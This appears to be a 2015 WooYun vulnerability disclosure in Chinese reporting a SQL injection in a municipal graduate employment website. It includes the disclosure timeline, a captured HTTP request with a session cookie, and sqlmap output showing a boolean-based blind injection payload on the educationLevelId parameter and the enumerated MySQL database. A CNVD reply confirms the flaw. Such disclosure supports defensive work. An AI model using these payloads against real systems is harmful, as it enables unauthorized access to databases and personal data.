wybug_title: 某市人力资源和社会保障局毕业生就业网SQL注入
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-10-19：	细节已通知厂商并且等待厂商处理中									2015-10-23：	厂商已经确认，细节仅向厂商公开									2015-11-02：	细节向核心白帽子及相关领域专家公开									2015-11-12：	细节向普通白帽子公开									2015-11-22：	细节向实习白帽子公开									2015-12-07：	细节向公众公开  简要描述： RT 详细说明：  
GET /job!search.action?educationLevelId=402881f7312165480131216ff6680011*&page.pageNo=5 HTTP/1.1X-Requested-With: XMLHttpRequestReferer: http://**.**.**.**:80/Cookie: votedIp=**.**.**.**; JSESSIONID=0416D7172D011139EBE073A607633892; frvrupxf=1; AJSTAT_ok_pages=36; AJSTAT_ok_times=1Host: **.**.**.**Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*

sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://**.**.**.**:80/job!search.action?educationLevelId=402881f7312165480131216ff6680011' AND 7609=7609 AND 'WEGm'='WEGm&page.pageNo=5---back-end DBMS: MySQL >= 5.0.2sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://**.**.**.**:80/job!search.action?educationLevelId=402881f7312165480131216ff6680011' AND 7609=7609 AND 'WEGm'='WEGm&page.pageNo=5---
   漏洞证明：  
sqlmap resumed the following injection point(s) from stored session:---Parameter: #1* (URI)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://**.**.**.**:80/job!search.action?educationLevelId=402881f7312165480131216ff6680011' AND 7609=7609 AND 'WEGm'='WEGm&page.pageNo=5---back-end DBMS: MySQL 5available databases [1]:[*] bjbys

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-10-23 11:23 厂商回复： CNVD确认并复现所述漏洞情况，已经转由CNCERT下发对应分中心，由其后续协调网站管理单位处置。  最新状态： 暂无
